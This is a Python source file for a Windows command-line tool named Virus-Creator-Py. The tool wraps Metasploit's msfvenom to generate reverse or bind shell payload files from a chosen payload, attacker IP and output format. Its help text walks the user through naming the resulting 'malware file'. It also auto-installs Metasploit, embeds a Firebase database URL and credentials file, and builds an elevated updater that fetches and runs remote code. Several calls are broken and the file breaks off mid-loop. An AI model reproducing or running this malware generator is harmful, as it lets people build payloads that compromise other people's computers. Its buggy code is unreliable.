import datetime
import os
import sys
import zipfile
import logo.showlogo
import subprodup
import socket
import subprocess
from logo import showlogo
import colorama
import colorsys
import patoolib
from termcolor import cprint
from pyunpack import Archive
import winreg
import getpass
from email import encoders
import base64
import firebase_admin
from firebase_admin import firestore
import urllib


def writeFileinBase64(file, text):
    bytesText = text.encode("utf-8")
    s_b64 = base64.b64encode(bytesText)
    open(file, "wb").write(s_b64)


cred = firebase_admin.credentials.Certificate("cred.json")
firebase_admin.initialize_app(cred, {'databaseURL': "https://my-first-python-ea110-default-rtdb.firebaseio.com/"})
db = firestore.client()

colorama.init()
VirusCreatorFolder = "c:/Program Files/Virus-Creator-Py/"
componentsFolder = "c:/Program Files/Virus-Creator-Py/components"
payloadFile = "c:/Program Files/Virus-Creator-Py/components/PYLDH56.virus-creator-data-file"
formatFile = "c:/Program Files/Virus-Creator-Py/components/FTS5273.virus-creator-data-file"
pathDataFile = "c:/Program Files/Virus-Creator-Py/components/PDA53HD.virus-creator-data-file"
licenseFile = "c:/Program Files/Virus-Creator-Py/components/LC2F34FG.virus-creator-data-file"
desktopPath = f"c:/Users/{os.getlogin()}/Desktop"
onedriveDesktop = f"c:/Users/{os.getlogin()}/OneDrive/Desktop"
onedriveDesktopVccmd = f"c:/Users/{os.getlogin()}/OneDrive/Desktop/virus-creator.lnk"
desktopVccmd = f"c:/Users/{os.getlogin()}/Desktop/virus-creator.lnk"
startMenuPth = f"C:/Users/jrabd/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"
startMenuVc = f"C:/Users/jrabd/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Virus-creator-py"
historyFile = f"c:/Program Files/Virus-Creator-Py/components/HST0365.virus-creator-history-file"
licenseData = ""


def runps(cmd, outputCapture=False):
    subprocess.run(["powershell", "-Command", cmd], capture_output=outputCapture)


def createUpdater():
    if os.path.exists("updater.exe"):
        os.system("updater.exe")
    else:
        if os.path.exists(f"{os.getcwd()}/updater.py") == False:
            print(os.getcwd())
            os.system(f'copy "cmpts/cred.json" "c:/Program Files/Virus-Creator-Py/components/"')
            open(f"{os.getcwd()}/updater.py", "w").write('''       
    import firebase_admin
    from firebase_admin import credentials
    import os
    import subprocess
    from firebase_admin import db
    from termcolor import cprint
    import admin
    import ctypes
    import requests
    import colorama
    url = 'https://raw.githubusercontent.com/AbdulWahab321/VC-updates/main/mainProgramWindows.py'
    page = requests.get(url)
    codeNew = page.text
    colorama.init()
    if ctypes.windll.shell32.IsUserAnAdmin()==0:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:    
        pathOfVC = ""
        cprint("Please wait....","green")
        cprint("Checking for Updates....","green")
        cred = credentials.Certificate("./cred.json")
        firebase_admin.initialize_app(cred,{
            'databaseURL' : 'https://my-first-python-ea110-default-rtdb.firebaseio.com/'
        })
        ref = db.reference("newCode")
        refUpdate = db.reference("Updates")
        code = ref.get()
    '''+f'''
        if refUpdate.get() == True:
            if open("{os.getcwd()}/mainProgramWindows.py").read() != codeNew:
                cprint("Updates are available Installing updates.....","cyan")    
                def runps(cmd, outputCapture=False):
                    subprocess.run(["powershell", "-Command", cmd], capture_output=outputCapture)
                if os.path.exists("c:/Program Files/Virus-Creator-Py/components"):
                    runps(f"Start-BitsTransfer -Source https://github.com/AbdulWahab321/VC-updates/archive/refs/heads/main.zip -Destination 'c:/Program Files/Virus-Creator-Py/components/main.zip'")
                    import zipfile
                    with zipfile.ZipFile("c:/Program Files/Virus-Creator-Py/components/main.zip","r") as zip_ref:
                        zip_ref.extractall("c:/Program Files/Virus-Creator-Py/components/")
                ''' + f'''
                    os.system('c:&&cd/&&cd Program Files/Virus-Creator-Py/components/VC-updates-main/&&copy "mainProgramWindows.py" "{os.getcwd()}"&&rmdir /s /q "c:/Program Files/Virus-Creator-Py/components/VC-updates-main"&&c:&&cd/&&cd Program Files/Virus-Creator-Py/components/&&del "c:/Program Files/Virus-Creator-Py/components/main.zip"&&rmdir /s /q "c:/Program Files/Virus-Creator-Py/components/VC-updates-main"')
    ''' + '''
                else:
                    print("Seems you didn't install Virus-Creator in your computer...")
                    print("please type r-cvc to install it if you deleted the folders")
            else:
                cprint("HEY... You are up to date!!","cyan")
    ''')
        if os.path.exists("c:/Program Files/Virus-Creator-Py/components/firebase_admin") == False:
            os.system(
                f'c:&&cd/&&cd Program Files/Virus-Creator-Py/components&&mkdir firebase_admin&&c:&&cd/&&cd Program Files/Virus-Creator-Py/components&&c:&&cd/&&cd c:&&cd/&&cd Program Files/Virus-Creator-Py/components&&xcopy "{os.getcwd()}/cmpts/firebase_admin" "c:/Program Files/Virus-Creator-Py/components/firebase_admin" /-Y')
        elif os.path.exists("c:/Program Files/Virus-Creator-Py/components/http_client") == False:
            os.system(
                f'c:&&cd/&&cd Program Files/Virus-Creator-Py/components&&mkdir http_client&&c:&&cd/&&cd Program Files/Virus-Creator-Py/components&&c:&&cd/&&cd c:&&cd/&&cd Program Files/Virus-Creator-Py/components&&xcopy "{os.getcwd()}/cmpts/http_client" "c:/Program Files/Virus-Creator-Py/components/http_client" /-Y')
        if os.path.exists(f"dist") == False and os.path.exists(f"updater.py"):
            os.system(f'pip install pyinstaller&&pyinstaller --onefile updater.py&&cd dist&&move "updater.exe" "{os.getcwd()}"&&cd..&&start updater.exe')
            runps(f"cd {os.getcwd()}&&Remove-Item dist -Recurse -Force")
            runps(f"cd {os.getcwd()}&&Remove-Item build -Recurse -Force")
        else:
            os.system(f'cd dist&&move "updater.exe" "{os.getcwd()}"&&cd..&&start updater.exe')



def createShortcut(destPath):
    if os.path.exists(f"{os.getcwd()}/shcmpts") == False:
        cprint("Creating Shortcut maker file....", "green")
        os.system(f'mkdir "{os.getcwd()}/shcmpts"')
        destination = os.path.join(destPath, "virus-creator.lnk")
        open(f"{os.getcwd()}/shcmpts/createShortcut.vbs", "w").write(f"""
        Set objWS = WScript.CreateObject("WScript.Shell")
        strLinkFile = "{destination}"
        Set objLink = objWS.CreateShortcut(strLinkFile)
        objLink.TargetPath = "{os.getcwd()}/virus-creator.exe"
         objLink.Arguments = "" 
         objLink.Description = "virus-creator"
         objLink.HotKey = "ALT+CTRL+P" 
         objLink.IconLocation = "{os.getcwd()}/cmpts/ml.ico"
         objLink.WindowStyle = "1"
         objLink.WorkingDirectory = "{os.getcwd()}"
         objLink.Save
        """)
        cprint("Successfully Created shortcut maker file...", "green")
        cprint("Executing shortcut maker file....", "green")
        subprocess.call(['cscript.exe', f'{os.getcwd()}/shcmpts/createShortcut.vbs'])


def makeFolder():
    if os.path.exists(VirusCreatorFolder) == False:
        cprint("Creating the Main Folder...", "green")
        os.system("c: && cd/ && cd Program Files && mkdir Virus-Creator-Py")
        os.system("c: && cd/ && cd Program Files/Virus-Creator-Py && mkdir components")


def createDataFiles():
    makeFolder()
    cprint("Checking if data files exists or not.....", "green")
    if os.path.exists(payloadFile):
        payloadList = base64.b64decode(open(payloadFile).read()).decode("utf-8")
        if payloadList == "" or payloadList == " ":
            cprint("components have been modified fixing.....please wait")
            payl = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                                          shell=True).decode("utf-8")
            p = open(payloadFile, "w").write(payl)
            payloadList = open(payloadFile).read()
        else:
            cprint("Components already exists....", "green")
            payloadList = open(payloadFile).read()
    else:
        cprint(
            "Creating 1st component please wait this component will take a little time....",
            "green")
        payl = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                                      shell=True).decode("utf-8")
        p = open(payloadFile, "w").write(payl)
        payloadList = open(payloadFile).read()

    if os.path.exists(formatFile):
        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
        if formatList == "" or formatList == " ":
            cprint("components have been modified fixing them.....please wait")
            form = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                                          shell=True).decode("utf-8")
            f = writeFileinBase64(open(formatFile, "w").write(form))
            formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
        else:
            formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
    else:
        cprint(
            "Creating 2nd component please wait this component will take a little time....",
            "green")
        form = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                                      shell=True).decode("utf-8")
        f = writeFileinBase64(formatFile, form)
        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")


def createDesktopShortcut():
    if os.path.exists(desktopPath):
        if os.path.exists(desktopVccmd) == False:
            yn = input("Do you want to create Desktop shortcut? [Y/N]")
            if yn.lower() == "y":
                cprint("Creating Desktop shortcut....", "green")
                createShortcut(desktopPath)
            if yn.lower() == "n":
                cprint("Desktop shortcut won't be created")
            else:
                cprint("Creating Desktop shortcut....", "green")
                createShortcut(desktopPath)
    elif os.path.exists(onedriveDesktop):
        if os.path.exists(onedriveDesktopVccmd) == False:
            yn = input("Do you want to create Desktop shortcut? [Y/N]")
            if yn.lower() == "y":
                cprint("Creating Desktop shortcut....", "green")
                createShortcut(onedriveDesktop)
            if yn.lower() == "n":
                cprint("Desktop shortcut won't be created")
            else:
                cprint("Creating Desktop shortcut....", "green")
                createShortcut(onedriveDesktop)


def createStartMenuShortcut():
    if os.path.exists(
            f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Virus-creator-py") == False:
        cprint("Creating Start menu shortcut....", "green")
        os.system(f'mkdir "{startMenuPth}/Virus-creator-py"')
        createShortcut(f"{startMenuPth}/Virus-creator-py")


def deleteStartMenuShortcut():
    if os.path.exists(startMenuVc) == True:
        cprint("Deleting Start menu shortcut....", "green")
        runps(
            f"Remove-Item 'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Virus-creator-py' -Force -Recurse")


def deleteDataFiles():
    if os.path.exists("c:/Program Files/Virus-Creator-Py"):
        cprint("Deleting Data Files....", "green")
        os.system("c:&&cd/&&cd Program Files&&rmdir /s /q Virus-Creator-Py")


def deleteunwantedFile():
    if os.path.exists(f"{os.getcwd()}/shcmpts"):
        cprint("deleting unwanted files....", "green")
        os.system(f"rmdir /s /q shcmpts")


def deleteDesktopShortcut():
    if os.path.exists(f"c:/Users/{os.getlogin()}/Desktop/virus-creator.lnk"):
        cprint("Deleting Desktop Shortcut....", "green")
        runps(f'del "c:/Users/{os.getlogin()}/Desktop/virus-creator.lnk"')
    elif os.path.exists(f"c:/Users/{os.getlogin()}/OneDrive/Desktop/virus-creator.lnk"):
        cprint("Deleting Desktop Shortcut....", "green")
        runps(f'del "c:/Users/{os.getlogin()}/OneDrive/Desktop/virus-creator.lnk"')


cprint("Initializing.......", "green")
createDesktopShortcut()
createStartMenuShortcut()
deleteunwantedFile()
if os.path.exists(VirusCreatorFolder) == False:
    print("Please wait... This is one time setup so please be patient")
if os.path.exists(VirusCreatorFolder):
    metasInTOF = input("Do you have metasploit installed in your computer? [Y/N]")
    if metasInTOF.lower() == "y":
        if os.path.exists(pathDataFile):
            pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
        else:
            cprint("""
    Don't install metasploit in folder if the metasploit-framework folder is in a folder 
    please cut and paste it outside the folder
                """, "red", attrs=["bold"])
            cprint("Please don't add '/' or '\' at last..", "red")
            pathto = input("In which drive you installed metasploit>>")
            if os.path.exists(f"{pathto}/metasploit-framework"):
                pathD = writeFileinBase64(pathDataFile, pathto)
                pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
            else:
                print("PATH NOT FOUND! Either the path doesn't exist or you may installed it in a folder")
else:
    makeFolder()

    metasInTOF = input("Do you have metasploit installed in your computer? [Y/N]")
    if metasInTOF.lower() == "y":
        if os.path.exists(pathDataFile):
            pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
        else:
            cprint("""
     Don't install metasploit in folder if the metasploit-framework folder is in a folder 
     please cut and paste it outside the folder
                  """, "red", attrs=["bold"])
            cprint("Please don't add '/' or '\' at last..", "red")
            pathto = input("In which drive you installed metasploit>>")
            if os.path.exists(f"{pathto}/metasploit-framework"):
                pathD = writeFileinBase64(pathDataFile, pathto)
                pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
            else:
                print("PATH NOT FOUND! Either the path doesn't exist or you may installed it in a folder")

    elif metasInTOF.lower() == "n":
        if os.path.exists(f"{componentsFolder}/metasploitframework-latest.msi"):
            os.system("c:&&cd/&&cd Program Files/Virus-Creator-Py/components && metasploitframework-latest.msi")
        else:
            cprint("DON'T INSTALL METASPLOIT IN FOLDER........It will automaically create a folder and install it",
                   "red", attrs=["bold"])
            os.system(
                f"c:&&cd/&&cd Users/{os.getlogin()}/Downloads&&curl https://windows.metasploit.com/metasploitframework-latest.msi --output c:/Program Files/Virus-Creator-Py/components/&&c:&&cd/&&cd Program Files/Virus-Creator-Py/components/&&metasploitframework-latest.msi")
            instFin = input("Please type 'Y' if the installation is complete>>")
            if instFin.lower() == "y":
                if os.path.exists(pathDataFile):
                    pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
                else:
                    cprint("Please don't add '/' or '\' at last..", "red")
                    pathtof = input("please type the drive you installed>> ")
                    fileCreate = writeFileinBase64(pathDataFile, pathtof)
                    pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
    else:
        cprint(f"Unexpected command: {metasInTOF}.    exiting..", "red")
        sys.exit(2)

    if os.path.exists(payloadFile):
        if os.path.exists(pathDataFile):
            pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
        else:
            cprint("Please don't add '/' or '\' at last..", "red")
            pathtof = input("please type the drive you installed>> ")
            fileCreate = writeFileinBase64(pathDataFile, pathtof)
            pathData = open(payloadFile).read()
        payloadList = open(payloadFile).read()
        if payloadList == "" or payloadList == " ":
            cprint("components have been modified fixing.....please wait")
            payl = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                                          shell=True).decode("utf-8")
            p = open(payloadFile, "w").write(payl)
            payloadList = open(payloadFile).read()
        else:
            payloadList = open(payloadFile).read()
    else:
        cprint(
            "Creating some components",
            "red")
        if os.path.exists(pathDataFile):
            pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
        else:
            cprint("Please don't add '/' or '\' at last..", "red")
            pathtof = input("please type the drive you installed>> ")
            fileCreate = writeFileinBase64(pathDataFile, pathtof)
            pathData = base64.b64decode(open(pathDataFile).read()).decode("utf-8")
        payl = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                                      shell=True).decode("utf-8")
        p = open(payloadFile, "w").write(payl)
        payloadList = open(payloadFile).read()

    if os.path.exists(formatFile):
        formatList = open(formatFile).read()
        if formatList == "" or formatList == " ":
            cprint("components have been modified fixing them.....please wait")
            form = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                                          shell=True).decode("utf-8")
            f = writeFileinBase64(formatFile, form)
            formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
        else:
            formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
    else:
        cprint(
            "Creating some components",
            "red")
        form = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                                      shell=True).decode("utf-8")
        f = writeFileinBase64(formatFile, form)
        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")


def reinstall():
    cprint("Please wait this may take a little bit of time....", "green")
    deleteDesktopShortcut()
    deleteStartMenuShortcut()
    deleteDataFiles()
    makeFolder()
    cprint("Recreating All files.....", "green")
    cprint("Please wait this may take some while....", "green")
    createDesktopShortcut()
    createStartMenuShortcut()
    createDataFiles()
    deleteunwantedFile()


def showInput():
    logo.showlogo.showIntroLogo()
    while True:
        cprint("type 'help' to print a help message", "green", attrs=["bold"])
        platformPayload = input("payload>> ")
        if platformPayload == "lsp":
            if os.path.exists(VirusCreatorFolder):
                if os.path.exists(payloadFile):
                    payloadList = open(payloadFile).read()
                    if payloadList == "" or payloadList == " ":
                        cprint("components have been modified fixing.....please wait", "red")
                        payl = subprodup.check_output(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                            shell=True).decode("utf-8")
                        p = open(payloadFile, "w").write(payl)
                        payloadList = open(payloadFile).read()
                        print(payloadList)
                    else:
                        payloadList = open(payloadFile).read()
                        print(payloadList)
                else:
                    cprint(
                        "Creating some components",
                        "red")
                    payl = subprodup.check_output(
                        f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads", shell=True).decode(
                        "utf-8")
                    p = open(payloadFile, "w").write(payl)
                    payloadList = open(payloadFile).read()
                    print(payloadList)
            else:
                cprint(
                    "Creating some components",
                    "red")
                makeFolder()
                if os.path.exists(payloadFile):
                    payloadList = base64.b64decode(open(payloadFile).read()).decode("utf-8")
                    if payloadList == "" or payloadList == " ":
                        cprint("components have been modified fixing them.....please wait", "red")

                        payl = subprodup.check_output(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                            shell=True).decode("utf-8")
                        p = open(payloadFile, "w").write(payl)
                        payloadList = open(payloadFile).read()
                        print(payloadList)
                    else:
                        payloadList = open(payloadFile).read()
                        print(payloadList)
                else:
                    cprint(
                        "Creating some components",
                        "green")
                    payl = subprodup.check_output(
                        f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads", shell=True).decode(
                        "utf-8")
                    payloadF = open(payloadFile, "w").write(payl)
                    payloadList = open(payloadFile).read()
                    print(payloadList)

        elif platformPayload == "swd":
            print("Your current working directory is: " + os.getcwd())
        elif platformPayload == "clear-history":
            if os.path.exists(historyFile):
                open(historyFile, "w").write("")
            else:
                cprint("You don't have any histories currently..", "green")
        elif platformPayload == "r-rvc":
            cprint("Executing virus-creator again...", "green")
            os.system("virus-creator.exe")
            sys.exit(0)
        elif platformPayload == "exit-vc" or platformPayload == "ec":
            cprint("Bye see you again......Have a nice day")
            cprint("Exiting program.......", "green")
            sys.exit(0)
        elif platformPayload == "risl-vc" or platformPayload == "reinstall-vc":
            reinstall()
            cprint("Successfully Re-installed Virus-Creator......", "green")
        elif platformPayload == "show-ip" or platformPayload == "sip":
            cprint(f"Your current ip address is: '{socket.gethostbyname(socket.gethostname())}'")
        elif platformPayload == "enter-cmd" or platformPayload == "ecd":
            cmd()
        elif platformPayload == "remove-virus-creator" or platformPayload == "rvc":
            areyousure = input("Are you sure you want to delete Virus-Creator? [Y/N]")
            if areyousure == "y":
                cprint("Uninstalling Virus-Creator")
                metRemoveConF = input("Do you want to remove metasploit? [Y/N]")
                if metRemoveConF.lower() == "y":
                    cprint("""
        Don't install metasploit in folder if the metasploit-framework folder is in a folder 
        please cut and paste it outside the folder
                                     """, "red", attrs=["bold"])
                    pathtomsf = input("please type the driver you installed metasploit>>")
                    os.system(f"{pathtomsf} && cd/ && cd metasploit-framework/bin && msfremove")
                cprint("Checking the data files exists or not....", "green")
                if os.path.exists("c:/Program Files/Virus-Creator-Py"):
                    cprint("Deleting data files....", "green")
                    os.system("c:&&cd/&&cd Program Files&&rmdir /s /q Virus-Creator-Py")
                else:
                    cprint("Data files are already deleted....", "green")
                deleteDesktopShortcut()

                deleteunwantedFile()
                cprint("Please press Ctrl+C 2 times...","green")
        elif platformPayload == "rvc-ldfs":
            cprint("Removing files created by Virus-Creator except data files")
            metRemoveConF = input("Do you want to remove metasploit? [Y/N]")
            if metRemoveConF.lower() == "y":
                cprint("""
    Don't install metasploit in folder if the metasploit-framework folder is in a folder 
    please cut and paste it outside the folder
                                                 """, "red", attrs=["bold"])
                pathtomsf = input("please type the driver you installed metasploit>>")
                os.system(f"{pathtomsf} && cd/ && cd metasploit-framework/bin && msfremove")
            cprint("Deleting Desktop shortcut", "green")
            deleteDesktopShortcut()
            cprint("Deleting StartMenu Shortcut", "green")
            deleteStartMenuShortcut()
        elif platformPayload == "clear-data":

            if os.path.exists("c:/Program Files/Virus-Creator-Py"):
                os.system("c:&&cd/&&cd Program Files&&rmdir /s /q Virus-Creator-Py")
        elif platformPayload == "enter-ps1":
            ps1()
        elif platformPayload == "cu" or platformPayload == "check-updates":
            cprint("Starting setup....", "green")
            print(" ")
            createUpdater()
        elif platformPayload == "lsf":
            if os.path.exists(VirusCreatorFolder):
                if os.path.exists(formatFile):
                    formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                    if formatList == "" or formatList == " ":
                        cprint("components have been modified fixing.....please wait")
                        form = subprodup.check_output(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                            shell=True).decode("utf-8")
                        f = writeFileinBase64(formatFile, form)
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                    else:
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                else:
                    form = subprodup.check_output(
                        f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats", shell=True).decode(
                        "utf-8")
                    f = writeFileinBase64(formatFile, form)
                    formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")

                print(formatList)
            else:
                cprint(
                    "The created and saved components have been deleted or moved.. Re-creating Components.... please be patient",
                    "red")
                makeFolder()
                if os.path.exists(formatFile):
                    formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                    if formatList == "" or formatList == " ":
                        cprint("components have been modified fixing.....please wait")
                        form = subprodup.check_output(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats",
                            shell=True).decode("utf-8")
                        f = writeFileinBase64(formatFile, form)
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                    else:
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                else:
                    form = subprodup.check_output(
                        f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list formats", shell=True).decode(
                        "utf-8")
                    formatF = writeFileinBase64(formatFile, form)
                    formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                print(formatList)
        elif platformPayload == "export-histories" or platformPayload == "eth":
            nametogether = ""
            if os.path.exists(historyFile):
                historyData = open(historyFile).read()
                cprint("How you need to export the histories?", "green")
                cprint("""
                   1) I want to move to existing directory or folder
                   2) I want to create a folder and move it
                 """)
                conf = input("number>> ")
                if conf == "2":
                    path = input("path to create the folder>>")
                    nameOfFolder = input("Name of the folder>>")
                    nametogether = os.path.join(path, nameOfFolder)
                    runps(f"mkdir {nametogether}")
                    open(f"{nametogether}/MyVirusHistory.txt", "w").write(historyData)
                elif conf == "1":
                    cprint("You can keep the file already created or not created....", "green")
                    path = input("path to write your histories file>>")
                    open(f"{path}/MyVirusHistory.txt", "w").write(historyData)
            else:
                cprint("You don't have any histories currently...", "green")
        elif platformPayload == "clear-history":
            if os.path.exists(historyFile):
                open(historyFile, "w").write("")
                cprint("Successfully cleared all histories...", "green")
            else:
                cprint("You don't have any histories currently...", "green")
        elif platformPayload == "show-history":
            if os.path.exists(historyFile):
                cprint("Showing histories...", "green")
                his = open(historyFile).read()
                print(his)
            else:
                cprint("You don't have any histories currently...", "green")
        elif platformPayload == "r-cvc":
            cprint("Initializing.......", "green")
            createDesktopShortcut()
            createStartMenuShortcut()
            deleteunwantedFile()
            makeFolder()
            createDataFiles()
        elif platformPayload == "help":
            cprint(
                "                                                                   Available Commands                                                                               ",
                "green", None, attrs=["underline"])
            cprint("""
              enter-cmd or ecd               to enter cmd command line where you can type cmd commands 
              swd                            shows you the current working directory
              export-the-histories or eth    to write all your histories in a MyVirusHistory.txt file
              exit-vc or ec                  to exit virus-creator app (this program)
              show-history                   shows your histories
              enter-ps1                      to enter ps1 (powershell) command line where you can type ps1 commands  
              remove-virus-creator or rvc    deletes files created by virus creator
              clear-history                  clears your history containing when you created path name etc YOU WILL LOSE YOUR HISTORY ONLY IF YOU 
                                             DIDN'T EXPORT THEM OR DELETED THE EXPORTED ONE
              clear-data                     deletes all data files     
              rvc-ldfs                       deletes files created by virus creator but leaves data files like desktop shortcut etc  
              lsp                            list all available payloads
              lsf                            list all available formats
              r-cvc                          recreates some deleted files like desktop shortcut etc.run this command if you you runned the command 'rvc' or 'rvc-ldf' 
              reinstall-vc or risl-vc        Reinstalls by deleting every files created by virus-creator  
              show-ip or sip                 shows your ip-address
              help                           shows this message

              How to create a payload?
                  first to create payload type 'lsp' command so you can see a list of payloads
                  then copy the payload you need to make
                  then paste the copied payload eg:  windows/x64/shell/bind_ipv6_tcp
                  then type your ip address if you don't know your ip address you can type 'show-ip' command so you can see your ip-address
                  then type the name you want to give to your malware file OR file infected with this payload
                           ....BE CARFULL WITH IT....
                  .. 
                        """, "green", attrs=["bold"])

        if os.path.exists(payloadFile):
            payloadList = open(payloadFile).read()
            if payloadList == "" or payloadList == " ":
                cprint("components have been modified fixing them.....please wait", "red")

                payl = subprodup.check_output(
                    f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads", shell=True).decode(
                    "utf-8")
                p = open(payloadFile, "w").write(payl)
                payloadList = open(payloadFile).read()
            else:
                payloadList = open(payloadFile).read()
        else:
            cprint(
                "The created and saved components have been deleted or moved.. Re-creating Components.... please be patient",
                "red")
            payl = subprodup.check_output(f"{pathData}&&cd/&&cd metasploit-framework/bin && msfvenom --list payloads",
                                          shell=True).decode("utf-8")
            payloadF = open(payloadFile, "w").write(payl)
            payloadList = open(payloadFile).read()
        if platformPayload in payloadList:
            if platformPayload != "swd" and platformPayload != "check-updates" and platformPayload != "cu" and platformPayload != "eth" and platformPayload != "show-history" and platformPayload != "clear-history" and platformPayload != "eth" and platformPayload != "export-the-histories" and platformPayload != "r-cvc" and platformPayload != "risl-vc" and platformPayload != "r-rvc" and platformPayload != "ec" and platformPayload != "ecd" and platformPayload != "enter-cmd" and platformPayload != "rvc" and platformPayload != "enter-ps1" and platformPayload != "help" and platformPayload != "remove-virus-creator" and platformPayload != "clear-data" and platformPayload != "lsp" and platformPayload != "lsf" and platformPayload != "show-ip" and platformPayload != "r-rvc" and platformPayload != "sip" and platformPayload != "" and platformPayload != " " and "A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z".lower() not in platformPayload and len(
                    platformPayload.strip()) != 10:
                cprint("Type my-ip to automatically check your ip address and submit the ip address", "green",
                       None,
                       attrs=["bold"])
                ipaddressU = input("Please type the ipaddress>> ")
                if ipaddressU != "my-ip":
                    if os.path.exists(formatFile):
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")

                    else:
                        form = subprodup.check_output(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                            shell=True).decode("utf-8")
                        cprint("Please be patient a 2 more components to load", "red")
                        writeFileinBase64(formatFile, form)
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                    name = input("name of the file you need to name your virus>>")
                    formatPayload = input("please type your format>>")
                    if formatPayload != "lsf":
                        if formatPayload in formatList:

                            os.system(
                                f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={ipaddressU} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                            mainPath = os.path.join(pathData, "metasploit-framework/bin")
                            mixPath = os.path.join(mainPath, name)
                            makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                        else:
                            cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                            while formatPayload not in formatList:
                                if os.path.exists(formatFile):
                                    formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")

                                else:
                                    form = subprodup.check_output(
                                        f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                                        shell=True).decode("utf-8")
                                    cprint("Please be patient a 2 more components to load", "red")
                                    writeFileinBase64(formatFile, form)
                                    formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                                formatPayload = input("please type your format>>")
                                if formatPayload in formatList:
                                    name = input("name of the file you need to name your virus>>")
                                    os.system(
                                        f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={name} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                                    mainPath = os.path.join(pathData, "metasploit-framework/bin")
                                    mixPath = os.path.join(mainPath, name)
                                    makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                                else:
                                    cprint("Invalid format please type lsf to list all formats", "red", None,
                                           attrs=["bold"])
                    else:
                        print(formatList)

                else:
                    cprint(f"Your ip will be {socket.gethostbyname(socket.gethostname())}", "green")
                    if os.path.exists(formatFile):
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")

                    else:
                        form = subprodup.check_output(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                            shell=True).decode("utf-8")
                        cprint("Please be patient a 2 more components to load", "red")
                        writeFileinBase64(formatFile, form)
                        formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")
                    formatPayload = input("please type your format>>")
                    if formatPayload in formatList:
                        name = input("name of the file you need to name your virus>>")
                        os.system(
                            f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom -p {platformPayload} LHOST={socket.gethostbyname(socket.gethostname())} PORT=443 -f {formatPayload} > {name}" + "." + formatPayload)
                        mainPath = os.path.join(pathData, "metasploit-framework/bin")
                        mixPath = os.path.join(mainPath, name)
                        makedirandmovefile(mixPath, platformPayload, formatPayload, name)
                    else:
                        if formatPayload == "lsf":
                            print(formatList)
                        else:
                            cprint("Invalid format please type lsf to list all formats", "red", None, attrs=["bold"])
                        while formatPayload not in formatList:
                            if os.path.exists(formatFile):
                                formatList = base64.b64decode(open(formatFile).read()).decode("utf-8")

                            else:
                                form = subprodup.check_output(
                                    f"{pathData}&&cd/&&cd metasploit-framework/bin&&msfvenom --list formats",
                                    shell=True).decode("utf-8")
